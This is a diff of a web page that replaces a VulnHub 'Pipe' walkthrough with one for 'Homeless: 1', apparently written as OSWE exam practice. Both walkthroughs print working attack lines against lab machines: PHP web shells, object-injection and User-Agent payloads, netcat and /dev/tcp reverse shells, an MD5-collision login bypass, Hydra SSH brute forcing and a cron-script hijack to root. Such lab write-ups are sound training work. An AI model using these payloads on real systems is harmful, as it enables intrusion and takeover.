@@ -6,32 +6,32 @@
     <meta name="turbo-cache-control" content="no-cache">
 
     <!-- Primary Meta Tags -->
-    <title>Pipe</title>
-    <meta name="title" content="Pipe">
+    <title>Homeless</title>
+    <meta name="title" content="Homeless">
     <meta name="description" content="Name" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://caueb.github.io/writeups/pipe/">
-    <meta property="og:title" content="Pipe">
+    <meta property="og:url" content="https://caueb.github.io/writeups/oswe-prep/homeless/">
+    <meta property="og:title" content="Homeless">
     <meta property="og:description" content="Name">
-    <meta property="og:image" content="https://caueb.github.io/writeups/pipe/pipe/untitled.png">
+    <meta property="og:image" content="https://caueb.github.io/writeups/oswe-prep/homeless/images/untitled.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://caueb.github.io/writeups/pipe/">
-    <meta property="twitter:title" content="Pipe">
+    <meta property="twitter:url" content="https://caueb.github.io/writeups/oswe-prep/homeless/">
+    <meta property="twitter:title" content="Homeless">
     <meta property="twitter:description" content="Name">
-    <meta property="twitter:image" content="https://caueb.github.io/writeups/pipe/pipe/untitled.png">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/oswe-prep/homeless/images/untitled.png">
     
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="/resources/css/retype.css?v=1.11.2.699675144980" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=1.11.2.699676486287" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=1.11.2.699675144980" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=1.11.2.699676486287" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=1.11.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=1.11.2.699675144980" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=1.11.2.699675144980" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=1.11.2.699676486287" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=1.11.2.699676486287" defer></script>
 </head>
     <body>
         <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -186,10 +186,10 @@
                 <div id="docs-sidebar-right-toggle"></div>
                
                 <!-- Page content  -->
-<doc-anchor-target id="pipe" class="break-words">
+<doc-anchor-target id="homeless" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#pipe">#</doc-anchor-trigger>
-        <span>Pipe</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#homeless">#</doc-anchor-trigger>
+        <span>Homeless</span>
     </h1>
 </doc-anchor-target>
 <div class="table-wrapper scrollbar overflow-hidden">
@@ -197,125 +197,297 @@
 <thead>
 <tr>
 <th>Name</th>
-<th>/dev/random: Pipe</th>
+<th>Homeless: 1</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Date release</td>
-<td>2 Oct 2015</td>
+<td>6 Dec 2017</td>
 </tr>
 <tr>
 <td>Author</td>
-<td>Sagi-</td>
+<td>Creatigon</td>
 </tr>
 <tr>
 <td>Link</td>
-<td><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">https://www.vulnhub.com/entry/devrandom-pipe,124/</a></td>
+<td><a href="https://www.vulnhub.com/series/securecode,445/">https://www.vulnhub.com/series/securecode,445/</a></td>
 </tr>
 </tbody>
 </table>
 </div>
-<doc-anchor-target id="machine-info">
+<doc-anchor-target id="goals">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#machine-info">#</doc-anchor-trigger>
-        <span>Machine Info</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#goals">#</doc-anchor-trigger>
+        <span>Goals</span>
     </h2>
 </doc-anchor-target>
-<p>Machine IP: 192.168.26.130</p>
-<doc-anchor-target id="start-of-enumeration">
+<p>You will be required to break into target server,exploit and root the machine, and retrieve the flag. The flag will contain more information about my private info..</p>
+<p><strong>Machine IP:</strong> 192.168.26.132</p>
+<doc-anchor-target id="recon">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#start-of-enumeration">#</doc-anchor-trigger>
-        <span>Start of enumeration</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
+        <span>Recon</span>
     </h2>
 </doc-anchor-target>
-<p>GET requests to <a href="http://192.168.26.130/index.php">http://192.168.26.130/index.php</a> are redirected to <code v-pre>index.php</code> and asks for credentials.<br />
-Changing the request to POST or even something that does not exist like &quot;GETS&quot;, we can bypass and get the <code v-pre>index.php</code> page.</p>
-<p>Looking at the source-code we find an interesting JS file:</p>
+<p>Running Nmap we see that there are 2 ports open, 22 SSH and 80 HTTP:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled.png" alt="" />
+    <img src="images/untitled.png" alt="" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Accessing <a href="http://192.168.26.130/scriptz/">http://192.168.26.130/scriptz/</a> we can find more files.</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled1.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>The file <code v-pre>log.php.BAK</code> file seems to be a logger:</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled2.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>Looking back to the <code v-pre>index.php</code> source-code we can see the parameters that are submitted in the form:</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled3.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>We now intercept the request for “Show Artist Info” in burp:</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled4.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled5.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>Decoding the <code v-pre>param</code> value:</p>
-<p><figure class="content-center">
-    <img src="pipe/untitled6.png" alt="" />
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>It seems that in this case a <code v-pre>Info</code> type object is being created. We know that a <code v-pre>Log</code> object will invoke the logger file and allow us to write to the webroot. We now attempt to tweak the request so that we can write some data to the webroot via the Log object.</p>
-<doc-anchor-target id="writing-to-disk-via-parameter">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#writing-to-disk-via-parameter">#</doc-anchor-trigger>
-        <span>Writing to disk via parameter</span>
-    </h2>
+<doc-anchor-target id="port-80">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80">#</doc-anchor-trigger>
+        <span>Port 80</span>
+    </h3>
 </doc-anchor-target>
-<p>Lets attempt to write a simple php web shell to <code v-pre>/scriptz/rce.php</code>:</p>
+<p>Looking at the website on port 80 I see an interesting thing on top of a image, what seems to be my User-Agent:</p>
+<p><figure class="content-center">
+    <img src="images/untitled1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Maybe we can inject some code there changing the User-Agent. First thing to check is what framework the website is built on. When trying to access <a href="http://192.168.26.132/index.php">http://192.168.26.132/index.php</a> I got a 200 OK response and the site loads.</p>
+<p>So now we know that the website is built on PHP lets try to inject some code.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">param=O:3:&quot;Log&quot;:2:{s:8:&quot;filename&quot;;s:29:&quot;/var/www/html/scriptz/rce.php&quot;;s:4:&quot;data&quot;;s:41:&quot;&lt;?php$cmd=$_GET['cmd'];system($cmd);?&gt;&quot;;}</code></pre>
+<pre class="language-php"><code v-pre class="language-php">User-Agent: &lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.26.128/4444 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
 </doc-codeblock></div>
-<p>It works! Our <code v-pre>rce.php</code> file is there.</p>
+<p>After trying for a couple minutes, nothing, except XSS, works.</p>
+<doc-anchor-target id="favicon">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#favicon">#</doc-anchor-trigger>
+        <span>Favicon</span>
+    </h3>
+</doc-anchor-target>
+<p>Another interesting thing is the webpage icon, it does look weird:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled7.png" alt="" />
+    <img src="images/untitled2.png" alt="" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<doc-anchor-target id="reaching-rce">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#reaching-rce">#</doc-anchor-trigger>
-        <span>Reaching RCE</span>
-    </h2>
-</doc-anchor-target>
-<p>The remote command execution can be triggered via <a href="http://192.168.26.130/scriptz/rce.php?cmd=id">http://192.168.26.130/scriptz/rce.php?cmd=id</a></p>
+<p>Looking closer <a href="http://192.168.26.132/images/favicon.jpg">http://192.168.26.132/images/favicon.jpg</a>:</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled8.png" alt="" />
+    <img src="images/untitled3.png" alt="" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<doc-anchor-target id="reverse-shell">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#reverse-shell">#</doc-anchor-trigger>
-        <span>Reverse Shell</span>
-    </h2>
+<p>Hard to read but if we put the words that are on the top of the image “Cyberdog Sledding Portal” in the User-Agent header it give us a hint to another page.</p>
+<p><figure class="content-center">
+    <img src="images/untitled4.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p><span class="docs-emoji">&#x1F928;</span> This part of the machine I didn’t like much, very unrealistic.</p>
+<doc-anchor-target id="upload-file">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#upload-file">#</doc-anchor-trigger>
+        <span>Upload File</span>
+    </h3>
 </doc-anchor-target>
-<p>Getting a reverse shell is trivial:</p>
+<p>Accessing <a href="http://192.168.26.132/myuploader_priv/">http://192.168.26.132/myuploader_priv/</a> we get a file upload form:</p>
+<p><figure class="content-center">
+    <img src="images/untitled5.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Trying to upload a php reverse shell gives me an error saying that the file is too large:</p>
+<p><figure class="content-center">
+    <img src="images/untitled6.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Even trying the smallest RCE in PHP I know <code v-pre>&lt;?=$_GET[1]?&gt;</code> was being flagged as too large. However, how about this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">http://192.168.26.130/scriptz/rce.php?cmd=nc 192.168.26.128 4444 -e /bin/bash</code></pre>
+<pre class="language-bash"><code v-pre class="language-bash">echo -n '&lt;?=`ls`;' &gt; test.php</code></pre>
 </doc-codeblock></div>
+<p>It is only 8 bytes!! Uploading the file called <code v-pre>test.php</code> works!</p>
 <p><figure class="content-center">
-    <img src="pipe/untitled9.png" alt="" />
+    <img src="images/untitled7.png" alt="" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
+<p>Accessing <a href="http://192.168.26.132/myuploader_priv/files/test.php">http://192.168.26.132/myuploader_priv/files/test.php</a> lists the files in the current directory:</p>
+<p><figure class="content-center">
+    <img src="images/untitled8.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Lets read that hash file:</p>
+<p><figure class="content-center">
+    <img src="images/untitled9.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>It is a hint to the next step.</p>
+<doc-anchor-target id="sign-in">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sign-in">#</doc-anchor-trigger>
+        <span>Sign in</span>
+    </h2>
+</doc-anchor-target>
+<p><a href="http://192.168.26.132/d5fa314e8577e3a7b8534a014b4dcb221de823ad/">http://192.168.26.132/d5fa314e8577e3a7b8534a014b4dcb221de823ad/</a></p>
+<p><figure class="content-center">
+    <img src="images/untitled10.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>I clicked on “Need hint?” after trying several techniques and failed. It give us the source code of <code v-pre>index.php</code>:</p>
+<p><figure class="content-center">
+    <img src="images/untitled11.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="code-analyses">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#code-analyses">#</doc-anchor-trigger>
+        <span>Code Analyses</span>
+    </h3>
+</doc-anchor-target>
+<p>The authentication mechanism of the form is to check the <strong>md5 hashes</strong> of the three provided values, compare them and return a valid session in case the hashes are identical. The trick here is that you can’t just pass equal values on the form and get the same <strong>md5 hashes</strong> as there is a pre-check that validates the input and requires the values of the fields to be different.</p>
+<p>So what we need here is to either steal someone else’s session or generate real md5 collisions</p>
+<p>The solution is to generate <strong>md5 collisions</strong> using a collision generator like <a href="https://github.com/thereal1024/python-md5-collision">Python MD5 Collision Library</a> by Stephen Halmor <a href="https://marc-stevens.nl/p/hashclash/">hashclash</a> by Marc Stevens to <strong>generate a pair of collisions</strong> and attach them to the POST query as binary data.</p>
+<doc-anchor-target id="generating-md5-collision">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#generating-md5-collision">#</doc-anchor-trigger>
+        <span>Generating MD5 Collision</span>
+    </h3>
+</doc-anchor-target>
+<p>Here is the Python library to use:</p>
+<p><a href="https://github.com/thereal1024/python-md5-collision">https://github.com/thereal1024/python-md5-collision</a></p>
+<p><figure class="content-center">
+    <img src="images/untitled12.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Now how do we pass this to the web server? The easiest way is using Curl!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">curl --data-urlencode username@out_test_001.txt --data-urlencode password@out_test_002.txt --data-urlencode code@out_test_003.txt --data-urlencode &quot;remember=1&amp;login=Login&quot; http://192.168.26.132/d5fa314e8577e3a7b8534a014b4dcb221de823ad/index.php -i</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="images/untitled13.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Adding the cookie to our PHPSESSION we can access <a href="http://192.168.26.132/d5fa314e8577e3a7b8534a014b4dcb221de823ad/admin.php">http://192.168.26.132/d5fa314e8577e3a7b8534a014b4dcb221de823ad/admin.php</a>:</p>
+<p><figure class="content-center">
+    <img src="images/untitled14.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>From here we have code execution on the machine:</p>
+<p><figure class="content-center">
+    <img src="images/untitled15.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Lets get a reverse shell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">nc -e /bin/sh 192.168.26.128 4444</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="images/untitled16.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="shell-as-www-data">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-www-data">#</doc-anchor-trigger>
+        <span>Shell as WWW-DATA</span>
+    </h2>
+</doc-anchor-target>
+<p>We are in.</p>
+<p><figure class="content-center">
+    <img src="images/untitled17.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Poking around I find a file called <code v-pre>todo.txt</code> in the <code v-pre>/home/downfall/</code> directory:</p>
+<p><figure class="content-center">
+    <img src="images/untitled18.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The hint talks about python.</p>
+<p>What we are looking for is a python script with <strong>insecure file permissions</strong> belonging to the downfall group, or a script where the owner is root and the file is of a different group:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">find / -type f -user root -group downfall 2&gt;/dev/null</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="images/untitled19.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p><figure class="content-center">
+    <img src="images/untitled20.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The above screenshot shows that the user downfall (belonging to the downfall group) has write privileges to this file. The files’ contents suggest that this may be a script called via a cron job, and the chances of it being run as root are high.</p>
+<p>Connecting the dots from previous enumeration, specifically the contents of the <code v-pre>robots.txt</code> file (remember rockyou), and now having a username means that we might have to use the <code v-pre>rockyou.txt</code> wordlist on the user downfall and try to brute force the password.</p>
+<doc-anchor-target id="bruteforce-ssh-downfall-user">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#bruteforce-ssh-downfall-user">#</doc-anchor-trigger>
+        <span>Bruteforce SSH downfall user</span>
+    </h3>
+</doc-anchor-target>
+<p>The creator of this VM is kind enough to suggest that the password starts with “sec”. Lets generate a wordlist based on <code v-pre>rockyou.txt</code> with only words that start with “sec”:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">grep -Pao '^sec.*$' /usr/share/wordlists/rockyou.txt &gt; seclist.txt</code></pre>
+</doc-codeblock></div>
+<p>Bruteforce SSH using Hydra:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">hydra -l downfall -P seclist.txt ssh://192.168.26.132</code></pre>
+</doc-codeblock></div>
+<p>Found the password:</p>
+<p><figure class="content-center">
+    <img src="images/untitled21.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Ok, lets SSH in as <code v-pre>downfall</code> user and password <code v-pre>secretlyinlove</code>:</p>
+<p><figure class="content-center">
+    <img src="images/untitled22.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="way-to-root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#way-to-root">#</doc-anchor-trigger>
+        <span>Way to root</span>
+    </h2>
+</doc-anchor-target>
+<p>Reading the file <code v-pre>.secret_message</code> we get a hint into how escalate to root:</p>
+<p><figure class="content-center">
+    <img src="images/untitled23.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Below I used <a href="https://github.com/DominicBreuker/pspy">PSPY</a> to monitor the processes and confirmed that <code v-pre>homeless.py</code> is being called from the cronjob with UID 0 (root):</p>
+<p><figure class="content-center">
+    <img src="images/untitled24.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>Since <code v-pre>homeless.py</code> does not have “execution” permissions and only <code v-pre>root</code> can change it, we need to create a new file:</p>
+<ol>
+<li>Moved <code v-pre>homeless.py</code> to <code v-pre>homeless.py.bak</code>.</li>
+<li>Created a new file called <code v-pre>homeless.py</code> and added a bash reverse shell:</li>
+</ol>
+<p><figure class="content-center">
+    <img src="images/untitled25.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<ol>
+<li>Started a netcat listener on my local machine and wait for the cronjob to trigger:</li>
+</ol>
+<p><figure class="content-center">
+    <img src="images/untitled26.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We are root!</p>
 
 
 
@@ -327,20 +499,20 @@ Changing the request to POST or even something that does not exist like &quot;GE
             
 <nav class="flex mt-14">
     <div class="w-1/2">
-        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/writeups/homeless/">
+        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/windowstricks/transfer-f-c525a/">
             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
             <span>
                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
-                <span class="block mt-1">Homeless</span>
+                <span class="block mt-1">Transfer Files</span>
             </span>
         </a>
     </div>
 
     <div class="w-1/2">
-        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writeups/securecode1/">
+        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="/writeups/oswe-prep/pipe/">
             <span>
                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                <span class="block mt-1">SecureCode1</span>
+                <span class="block mt-1">Pipe</span>
             </span>
             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
         </a>
@@ -388,6 +560,6 @@ Changing the request to POST or even something that does not exist like &quot;GE
 
         <div id="docs-overlay-target"></div>
 
-        <script>window.__DOCS__ = { "title": "Pipe", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
+        <script>window.__DOCS__ = { "title": "Homeless", icon: "file", hasPrism: true, hasMermaid: false, hasMath: false }</script>
     </body>
 </html>
